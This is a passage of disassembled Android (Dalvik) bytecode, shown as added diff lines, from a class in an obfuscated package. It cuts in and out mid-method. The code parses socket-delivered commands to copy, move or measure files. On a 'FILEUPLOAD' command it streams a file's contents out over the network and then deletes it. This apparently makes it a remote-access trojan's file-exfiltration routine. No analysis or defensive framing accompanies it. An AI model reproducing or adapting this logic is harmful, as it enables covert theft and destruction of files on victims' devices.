+run-BB@0xa28 : [ run-BB@0xa44 run-BB@0xc50 ]
+	642     (00000a28) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	643     (00000a2c) invoke-virtual       v1, v9, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+	644     (00000a32) move-result-object   v1
+	645     (00000a34) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	646     (00000a38) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	647     (00000a3c) array-length         v1, v1
+	648     (00000a3e) const/4              v4, 4
+	649     (00000a40) if-ne                v1, v4, +108
+	a1c:a6b
+	(Ljava/net/SocketException; -> e2c run-BB@0xe2c)
+	(Ljava/lang/Exception; -> c62 run-BB@0xc62)
+
+run-BB@0xa44 : [ run-BB@0xa70 ]
+	650     (00000a44) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	651     (00000a48) aget-object          v1, v1, v23
+	652     (00000a4c) invoke-static        v1, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J
+	653     (00000a52) move-result-wide     v26
+	654     (00000a54) new-instance         v1, Ljava/io/File;
+	655     (00000a58) sget-object          v8, Lcom/mixio/tosh/aprl/aetn/ate;->c Ljava/io/File;
+	656     (00000a5c) new-instance         v4, Ljava/lang/StringBuilder;
+	657     (00000a60) invoke-direct        v4, Ljava/lang/StringBuilder;-><init>()V
+	658     (00000a66) invoke-virtual       v4, v6, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	659     (00000a6c) move-object/from16   v24, v9
+
+run-BB@0xa70 : [ run-BB@0xaa0 run-BB@0xaea ]
+	660     (00000a70) iget-object          v9, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	661     (00000a74) aget-object          v9, v9, v12
+	662     (00000a78) invoke-virtual       v9, Ljava/lang/String;->trim()Ljava/lang/String;
+	663     (00000a7e) move-result-object   v9
+	664     (00000a80) invoke-virtual       v4, v9, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	665     (00000a86) invoke-virtual       v4, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	666     (00000a8c) move-result-object   v4
+	667     (00000a8e) invoke-direct        v1, v8, v4, Ljava/io/File;-><init>(Ljava/io/File; Ljava/lang/String;)V
+	668     (00000a94) invoke-virtual       v1, Ljava/io/File;->exists()Z
+	669     (00000a9a) move-result          v4
+	670     (00000a9c) if-eqz               v4, +27
+	a70:a9b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c4c run-BB@0xc4c)
+
+run-BB@0xaa0 : [ run-BB@0xaac run-BB@0xaea ]
+	671     (00000aa0) invoke-virtual       v1, Ljava/io/File;->isFile()Z
+	672     (00000aa6) move-result          v4
+	673     (00000aa8) if-eqz               v4, +21
+	aa0:abb
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> ae2 run-BB@0xae2)
+
+run-BB@0xaac : [ run-BB@0xabc ]
+	674     (00000aac) new-instance         v4, Ljava/lang/StringBuilder;
+	675     (00000ab0) invoke-direct        v4, Ljava/lang/StringBuilder;-><init>()V
+	676     (00000ab6) invoke-virtual       v4, v5, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	aa0:abb
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> ae2 run-BB@0xae2)
+
+run-BB@0xabc : [ run-BB@0xc3e ]
+	677     (00000abc) invoke-virtual       v1, Ljava/io/File;->length()J
+	678     (00000ac2) move-result-wide     v8
+	679     (00000ac4) invoke-virtual       v4, v8, v9, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
+	680     (00000aca) invoke-virtual       v4, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	681     (00000ad0) move-result-object   v1
+	682     (00000ad2) move-object/from16   v29, v11
+	683     (00000ad6) goto/16              +b4
+	abc:ad1
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> ada run-BB@0xada)
+
+run-BB@0xada : [ run-BB@0x9be ]
+	684     (00000ada) move-exception       v0
+	685     (00000adc) move-object          v1, v0
+	686     (00000ade) goto/16              -90
+
+run-BB@0xae2 : [ run-BB@0x9be ]
+	687     (00000ae2) move-exception       v0
+	688     (00000ae4) move-object          v1, v0
+	689     (00000ae6) goto/16              -94
+
+run-BB@0xaea : [ run-BB@0xb10 run-BB@0xc36 ]
+	690     (00000aea) new-instance         v4, Ljava/io/File;
+	691     (00000aee) iget-object          v8, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	692     (00000af2) aget-object          v8, v8, v22
+	693     (00000af6) invoke-virtual       v8, Ljava/lang/String;->trim()Ljava/lang/String;
+	694     (00000afc) move-result-object   v8
+	695     (00000afe) invoke-direct        v4, v8, Ljava/io/File;-><init>(Ljava/lang/String;)V
+	696     (00000b04) invoke-virtual       v4, Ljava/io/File;->isFile()Z
+	697     (00000b0a) move-result          v8
+	698     (00000b0c) if-eqz               v8, +95
+	aea:b59
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c44 run-BB@0xc44)
+
+run-BB@0xb10 : [ run-BB@0xb1c run-BB@0xc36 ]
+	699     (00000b10) invoke-virtual       v4, Ljava/io/File;->exists()Z
+	700     (00000b16) move-result          v8
+	701     (00000b18) if-eqz               v8, +8f
+	aea:b59
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c44 run-BB@0xc44)
+
+run-BB@0xb1c : [ run-BB@0xb30 run-BB@0xc2c ]
+	702     (00000b1c) invoke-virtual       v4, Ljava/io/File;->length()J
+	703     (00000b22) move-result-wide     v8
+	704     (00000b24) const-wide/16        v29, 0 # [0.0]
+	705     (00000b28) cmp-long             v28, v8, v29
+	706     (00000b2c) if-lez               v28, +80
+	aea:b59
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c44 run-BB@0xc44)
+
+run-BB@0xb30 : [ run-BB@0xb4c ]
+	707     (00000b30) new-instance         v8, Ljava/io/FileInputStream;
+	708     (00000b34) invoke-direct        v8, v4, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
+	709     (00000b3a) new-instance         v4, Ljava/io/FileOutputStream;
+	710     (00000b3e) invoke-direct        v4, v1, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
+	711     (00000b44) const/16             v1, 1024
+	712     (00000b48) new-array            v1, v1, [B
+	aea:b59
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c44 run-BB@0xc44)
+
+run-BB@0xb4c : [ run-BB@0xb64 run-BB@0xb72 ]
+	713     (00000b4c) const/16             v9, 1024
+	714     (00000b50) const/4              v12, 0
+	715     (00000b52) invoke-virtual       v8, v1, v12, v9, Ljava/io/FileInputStream;->read([B I I)I
+	716     (00000b58) move-result          v9
+	717     (00000b5a) move-object/from16   v29, v11
+	718     (00000b5e) const/4              v11, -1
+	719     (00000b60) if-eq                v9, v11, +9
+
+run-BB@0xb64 : [ run-BB@0xb4c ]
+	720     (00000b64) invoke-virtual       v4, v1, v12, v9, Ljava/io/FileOutputStream;->write([B I I)V
+	721     (00000b6a) move-object/from16   v11, v29
+	722     (00000b6e) const/4              v12, 1
+	723     (00000b70) goto                 -12
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xb72 : [ run-BB@0xbf2 run-BB@0xc26 ]
+	724     (00000b72) invoke-virtual       v4, Ljava/io/FileOutputStream;->close()V
+	725     (00000b78) invoke-virtual       v8, Ljava/io/FileInputStream;->close()V
+	726     (00000b7e) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	727     (00000b82) const-string         v4, 'filname'
+	728     (00000b86) iget-object          v8, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	729     (00000b8a) const/4              v9, 1
+	730     (00000b8c) aget-object          v8, v8, v9
+	731     (00000b90) invoke-virtual       v8, Ljava/lang/String;->trim()Ljava/lang/String;
+	732     (00000b96) move-result-object   v8
+	733     (00000b98) invoke-interface     v1, v4, v8, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String; Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
+	734     (00000b9e) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	735     (00000ba2) invoke-interface     v1, Landroid/content/SharedPreferences$Editor;->commit()Z
+	736     (00000ba8) new-instance         v1, Ljava/io/File;
+	737     (00000bac) sget-object          v4, Lcom/mixio/tosh/aprl/aetn/ate;->c Ljava/io/File;
+	738     (00000bb0) new-instance         v8, Ljava/lang/StringBuilder;
+	739     (00000bb4) invoke-direct        v8, Ljava/lang/StringBuilder;-><init>()V
+	740     (00000bba) invoke-virtual       v8, v6, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	741     (00000bc0) iget-object          v9, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	742     (00000bc4) const/4              v11, 1
+	743     (00000bc6) aget-object          v9, v9, v11
+	744     (00000bca) invoke-virtual       v9, Ljava/lang/String;->trim()Ljava/lang/String;
+	745     (00000bd0) move-result-object   v9
+	746     (00000bd2) invoke-virtual       v8, v9, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	747     (00000bd8) invoke-virtual       v8, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	748     (00000bde) move-result-object   v8
+	749     (00000be0) invoke-direct        v1, v4, v8, Ljava/io/File;-><init>(Ljava/io/File; Ljava/lang/String;)V
+	750     (00000be6) invoke-virtual       v1, Ljava/io/File;->exists()Z
+	751     (00000bec) move-result          v4
+	752     (00000bee) if-eqz               v4, +1c
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xbf2 : [ run-BB@0xbfe run-BB@0xc26 ]
+	753     (00000bf2) invoke-virtual       v1, Ljava/io/File;->isFile()Z
+	754     (00000bf8) move-result          v4
+	755     (00000bfa) if-eqz               v4, +16
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xbfe : [ run-BB@0xc3e ]
+	756     (00000bfe) new-instance         v4, Ljava/lang/StringBuilder;
+	757     (00000c02) invoke-direct        v4, Ljava/lang/StringBuilder;-><init>()V
+	758     (00000c08) invoke-virtual       v4, v5, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	759     (00000c0e) invoke-virtual       v1, Ljava/io/File;->length()J
+	760     (00000c14) move-result-wide     v8
+	761     (00000c16) invoke-virtual       v4, v8, v9, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
+	762     (00000c1c) invoke-virtual       v4, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	763     (00000c22) move-result-object   v1
+	764     (00000c24) goto                 +d
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xc26 : [ run-BB@0xc3e ]
+	765     (00000c26) const-string         v1, 'Error:'
+	766     (00000c2a) goto                 +a
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xc2c : [ run-BB@0xc3e ]
+	767     (00000c2c) move-object/from16   v29, v11
+	768     (00000c30) const-string         v1, 'Sized:'
+	769     (00000c34) goto                 +5
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xc36 : [ run-BB@0xc3e ]
+	770     (00000c36) move-object/from16   v29, v11
+	771     (00000c3a) const-string         v1, 'Moved:'
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xc3e : [ run-BB@0xc88 ]
+	772     (00000c3e) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	773     (00000c42) goto                 +23
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xc44 : [ run-BB@0xc6c ]
+	774     (00000c44) move-exception       v0
+	775     (00000c46) move-object/from16   v29, v11
+	776     (00000c4a) goto                 +11
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xc4c : [ run-BB@0xc68 ]
+	777     (00000c4c) move-exception       v0
+	778     (00000c4e) goto                 +d
+	b64:c5b
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> c5e run-BB@0xc5e)
+
+run-BB@0xc50 : [ run-BB@0xc84 ]
+	779     (00000c50) move-object/from16   v24, v9
+	780     (00000c54) move-object/from16   v29, v11
+	781     (00000c58) iput-object          v14, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	782     (00000c5c) goto                 +14
+
+run-BB@0xc5e : [ run-BB@0xc6c ]
+	783     (00000c5e) move-exception       v0
+	784     (00000c60) goto                 +6
+
+run-BB@0xc62 : [ run-BB@0xc68 ]
+	785     (00000c62) move-exception       v0
+	786     (00000c64) move-object/from16   v24, v9
+
+run-BB@0xc68 : [ run-BB@0xc6c ]
+	787     (00000c68) move-object/from16   v29, v11
+
+run-BB@0xc6c : [ run-BB@0xc6e ]
+	788     (00000c6c) move-object          v1, v0
+
+run-BB@0xc6e : [ run-BB@0xe40 ]
+	789     (00000c6e) const/16             v6, 512
+	790     (00000c72) const/4              v9, -1
+	791     (00000c74) goto/16              +e6
+
+run-BB@0xc78 : [ run-BB@0xc80 ]
+	792     (00000c78) move-object/from16   v24, v9
+	793     (00000c7c) move-object/from16   v29, v11
+
+run-BB@0xc80 : [ run-BB@0xc84 ]
+	794     (00000c80) iput-object          v14, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	c80:d6d
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> e1c run-BB@0xe1c)
+
+run-BB@0xc84 : [ run-BB@0xc88 ]
+	795     (00000c84) const-wide/16        v26, 0 # [0.0]
+	c80:d6d
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> e1c run-BB@0xe1c)
+
+run-BB@0xc88 : [ run-BB@0xcfa run-BB@0xe10 ]
+	796     (00000c88) move-wide/from16     v8, v26
+	797     (00000c8c) const/4              v1, 0
+	798     (00000c8e) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	799     (00000c92) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	800     (00000c96) invoke-virtual       v1, Ljava/lang/String;->getBytes()[B
+	801     (00000c9c) move-result-object   v1
+	802     (00000c9e) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	803     (00000ca2) new-instance         v1, Ljava/lang/StringBuilder;
+	804     (00000ca6) invoke-direct        v1, Ljava/lang/StringBuilder;-><init>()V
+	805     (00000cac) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	806     (00000cb0) invoke-virtual       v1, v4, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	807     (00000cb6) invoke-virtual       v1, v10, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	808     (00000cbc) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	809     (00000cc0) const/4              v11, 1
+	810     (00000cc2) aget-object          v4, v4, v11
+	811     (00000cc6) invoke-virtual       v1, v4, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	812     (00000ccc) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	813     (00000cd0) aget-object          v4, v4, v23
+	814     (00000cd4) invoke-virtual       v1, v4, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	815     (00000cda) invoke-virtual       v1, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	816     (00000ce0) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	817     (00000ce4) invoke-virtual       v2, v1, Ljava/io/DataOutputStream;->write([B)V
+	818     (00000cea) const-string         v1, 'FILEUPLOAD'
+	819     (00000cee) invoke-virtual       v7, v3, v1, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/io/DataInputStream; Ljava/lang/String;)Z
+	820     (00000cf4) move-result          v1
+	821     (00000cf6) if-eqz               v1, +8d
+	c80:d6d
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> e1c run-BB@0xe1c)
+
+run-BB@0xcfa : [ run-BB@0xd0a run-BB@0xe10 ]
+	822     (00000cfa) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	823     (00000cfe) invoke-virtual       v1, v5, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	824     (00000d04) move-result          v1
+	825     (00000d06) if-eqz               v1, +85
+	c80:d6d
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> e1c run-BB@0xe1c)
+
+run-BB@0xd0a : [ run-BB@0xd6a ]
+	826     (00000d0a) const/4              v1, 0
+	827     (00000d0c) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	828     (00000d10) const/16             v1, 512
+	829     (00000d14) new-array            v4, v1, [B
+	830     (00000d18) iput-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	831     (00000d1c) new-instance         v1, Ljava/io/File;
+	832     (00000d20) sget-object          v4, Lcom/mixio/tosh/aprl/aetn/ate;->c Ljava/io/File;
+	833     (00000d24) new-instance         v5, Ljava/lang/StringBuilder;
+	834     (00000d28) invoke-direct        v5, Ljava/lang/StringBuilder;-><init>()V
+	835     (00000d2e) invoke-virtual       v5, v6, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	836     (00000d34) iget-object          v6, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	837     (00000d38) const/4              v11, 1
+	838     (00000d3a) aget-object          v6, v6, v11
+	839     (00000d3e) invoke-virtual       v6, Ljava/lang/String;->trim()Ljava/lang/String;
+	840     (00000d44) move-result-object   v6
+	841     (00000d46) invoke-virtual       v5, v6, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	842     (00000d4c) invoke-virtual       v5, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	843     (00000d52) move-result-object   v5
+	844     (00000d54) invoke-direct        v1, v4, v5, Ljava/io/File;-><init>(Ljava/io/File; Ljava/lang/String;)V
+	845     (00000d5a) new-instance         v4, Ljava/io/FileInputStream;
+	846     (00000d5e) invoke-direct        v4, v1, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
+	847     (00000d64) invoke-virtual       v4, v8, v9, Ljava/io/FileInputStream;->skip(J)J
+	c80:d6d
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> e1c run-BB@0xe1c)
+
+run-BB@0xd6a : [ run-BB@0xd74 ]
+	848     (00000d6a) iget-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	849     (00000d6e) const/16             v6, 512
+	850     (00000d72) const/4              v8, 0
+
+run-BB@0xd74 : [ run-BB@0xd86 run-BB@0xd96 ]
+	851     (00000d74) invoke-virtual       v4, v5, v8, v6, Ljava/io/FileInputStream;->read([B I I)I
+	852     (00000d7a) move-result          v5
+	853     (00000d7c) iput                 v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	854     (00000d80) const/4              v9, -1
+	855     (00000d82) if-eq                v5, v9, +a
+	d74:d7f
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> e0a run-BB@0xe0a)
+
+run-BB@0xd86 : [ run-BB@0xd6a ]
+	856     (00000d86) iget-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	857     (00000d8a) iget                 v11, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	858     (00000d8e) invoke-virtual       v2, v5, v8, v11, Ljava/io/DataOutputStream;->write([B I I)V
+	859     (00000d94) goto                 -15
+	d86:db9
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> e04 run-BB@0xe04)
+
+run-BB@0xd96 : [ run-BB@0xdbe run-BB@0xe16 ]
+	860     (00000d96) invoke-virtual       v1, Ljava/io/File;->delete()Z
+	861     (00000d9c) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	862     (00000da0) const/4              v4, 0
+	863     (00000da2) aget-object          v1, v1, v4
+	864     (00000da6) invoke-virtual       v1, Ljava/lang/String;->trim()Ljava/lang/String;
+	865     (00000dac) move-result-object   v1
+	866     (00000dae) const-string         v4, 'pFile'
+	867     (00000db2) invoke-virtual       v1, v4, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+	868     (00000db8) move-result          v1
+	869     (00000dba) if-eqz               v1, +2e
+
+run-BB@0xdbe : [ run-BB@0xde4 run-BB@0xe16 ]
+	870     (00000dbe) new-instance         v1, Ljava/io/File;
+	871     (00000dc2) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	872     (00000dc6) aget-object          v4, v4, v22
+	873     (00000dca) invoke-virtual       v4, Ljava/lang/String;->trim()Ljava/lang/String;
+	874     (00000dd0) move-result-object   v4
+	875     (00000dd2) invoke-direct        v1, v4, Ljava/io/File;-><init>(Ljava/lang/String;)V
+	876     (00000dd8) invoke-virtual       v1, Ljava/io/File;->exists()Z
+	877     (00000dde) move-result          v4
+	878     (00000de0) if-eqz               v4, +1b
+	dbe:df5
+	(Ljava/lang/Exception; -> df8 run-BB@0xdf8)
+
+run-BB@0xde4 : [ run-BB@0xdf0 run-BB@0xe16 ]
+	879     (00000de4) invoke-virtual       v1, Ljava/io/File;->isFile()Z
+	880     (00000dea) move-result          v4
+	881     (00000dec) if-eqz               v4, +15
+	dbe:df5
+	(Ljava/lang/Exception; -> df8 run-BB@0xdf8)
+
+run-BB@0xdf0 : [ run-BB@0xe16 ]
+	882     (00000df0) invoke-virtual       v1, Ljava/io/File;->delete()Z
+	883     (00000df6) goto                 +10
+
+run-BB@0xdf8 : [ run-BB@0xdfc ]
+	884     (00000df8) move-exception       v0
+	885     (00000dfa) move-object          v1, v0
+
+run-BB@0xdfc : [ run-BB@0xe16 ]
+	886     (00000dfc) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	887     (00000e02) goto                 +a
+	dfc:e01
+	(Ljava/net/SocketException; -> e24 run-BB@0xe24)
+	(Ljava/lang/Exception; -> e04 run-BB@0xe04)
+
+run-BB@0xe04 : [ run-BB@0xe06 ]
+	888     (00000e04) move-exception       v0
+
+run-BB@0xe06 : [ run-BB@0xe40 ]
+	889     (00000e06) move-object          v1, v0
+	890     (00000e08) goto                 +1c
+
+run-BB@0xe0a : [ run-BB@0xe0c ]
+	891     (00000e0a) move-exception       v0
+
+run-BB@0xe0c : [ run-BB@0xe06 ]
+	892     (00000e0c) const/4              v9, -1
+	893     (00000e0e) goto                 -4
+
+run-BB@0xe10 : [ run-BB@0xe16 ]
+	894     (00000e10) const/16             v6, 512
+	895     (00000e14) const/4              v9, -1
+
+run-BB@0xe16 : [ run-BB@0xeae ]
+	896     (00000e16) const/4              v1, 1
+	897     (00000e18) const/4              v4, 0
+	898     (00000e1a) goto                 +4a
+
+run-BB@0xe1c : [ run-BB@0xe1e ]
+	899     (00000e1c) move-exception       v0
+
+run-BB@0xe1e : [ run-BB@0xe0c ]
+	900     (00000e1e) const/16             v6, 512
+	901     (00000e22) goto                 -b
+
+run-BB@0xe24 : [ run-BB@0xebe ]
+	902     (00000e24) move-exception       v0
+	903     (00000e26) goto                 +4c
+
+run-BB@0xe28 : [ run-BB@0xe36 ]
+	904     (00000e28) move-exception       v0
+	905     (00000e2a) goto                 +6
+
+run-BB@0xe2c : [ run-BB@0xeba ]
+	906     (00000e2c) move-exception       v0
+	907     (00000e2e) goto                 +46
+
+run-BB@0xe30 : [ run-BB@0xe36 ]
+	908     (00000e30) move-exception       v0
+	909     (00000e32) move-object/from16   v18, v8
+
+run-BB@0xe36 : [ run-BB@0xe1e ]
+	910     (00000e36) move-object/from16   v24, v9
+	911     (00000e3a) move-object/from16   v29, v11
+	912     (00000e3e) goto                 -10
+
+run-BB@0xe40 : [ run-BB@0xeae ]
+	913     (00000e40) iput-object          v14, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	914     (00000e44) const/4              v4, 0
+	915     (00000e46) iput-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	916     (00000e4a) iget-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	917     (00000e4e) invoke-virtual       v5, Ljava/lang/String;->getBytes()[B
+	918     (00000e54) move-result-object   v5
+	919     (00000e56) iput-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	920     (00000e5a) iget-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	921     (00000e5e) array-length         v5, v5
+	922     (00000e60) invoke-static        v5, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+	923     (00000e66) move-result-object   v5
+	924     (00000e68) invoke-virtual       v5, Ljava/lang/String;->getBytes()[B
+	925     (00000e6e) move-result-object   v5
+	926     (00000e70) invoke-virtual       v2, v5, Ljava/io/DataOutputStream;->write([B)V
+	927     (00000e76) new-instance         v5, Ljava/lang/StringBuilder;
+	928     (00000e7a) invoke-direct        v5, Ljava/lang/StringBuilder;-><init>()V
+	929     (00000e80) const-string         v8, 'ate files '
+	930     (00000e84) invoke-virtual       v5, v8, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	931     (00000e8a) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	932     (00000e90) move-result-object   v8
+	933     (00000e92) invoke-virtual       v5, v8, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	934     (00000e98) invoke-virtual       v5, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	935     (00000e9e) move-result-object   v5
+	936     (00000ea0) invoke-static        v5, Lcom/mixio/tosh/aprl/aetn/ate;->b(Ljava/lang/String;)V
+	937     (00000ea6) invoke-virtual       v1, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	938     (00000eac) const/4              v1, 1
+	e40:f13
+	(Ljava/lang/Exception; -> f30 run-BB@0xf30)
+
+run-BB@0xeae : [ run-BB@0xf10 ]
+	939     (00000eae) iput-boolean         v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->f Z
+	940     (00000eb2) goto                 +2f
+	e40:f13
+	(Ljava/lang/Exception; -> f30 run-BB@0xf30)
+
+run-BB@0xeb4 : [ run-BB@0xeba ]
+	941     (00000eb4) move-exception       v0
+	942     (00000eb6) move-object/from16   v18, v8
+	e40:f13
+	(Ljava/lang/Exception; -> f30 run-BB@0xf30)
+
+run-BB@0xeba : [ run-BB@0xebe ]
+	943     (00000eba) move-object/from16   v24, v9
+	e40:f13
+	(Ljava/lang/Exception; -> f30 run-BB@0xf30)
+
+run-BB@0xebe : [ run-BB@0xec0 ]
+	944     (00000ebe) move-object          v1, v0
+	e40:f13
+	(Ljava/lang/Exception; -> f30 run-BB@0xf30)
+
+run-BB@0xec0 : [ run-BB@0xf70 ]
+	945     (00000ec0) new-instance         v2, Ljava/lang/StringBuilder;
+	946     (00000ec4) invoke-direct        v2, Ljava/lang/StringBuilder;-><init>()V
+	947     (00000eca) const-string         v3, 'ate files socket'
+	948     (00000ece) invoke-virtual       v2, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	949     (00000ed4) invoke-virtual       v1, Ljava/net/SocketException;->getMessage()Ljava/lang/String;
+	950     (00000eda) move-result-object   v3
+	951     (00000edc) invoke-virtual       v2, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
